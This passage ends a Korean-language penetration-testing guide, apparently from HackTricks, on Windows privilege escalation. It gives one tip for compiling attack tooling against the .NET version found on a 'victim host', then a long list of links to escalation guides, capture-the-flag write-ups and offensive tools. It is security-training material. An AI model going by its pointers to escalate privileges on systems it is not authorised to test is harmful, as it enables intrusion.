프로젝트는 올바른 버전의 .NET을 사용해 compile해야 합니다([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). 피해 호스트에 설치된 .NET 버전을 확인하려면 다음을 수행할 수 있습니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
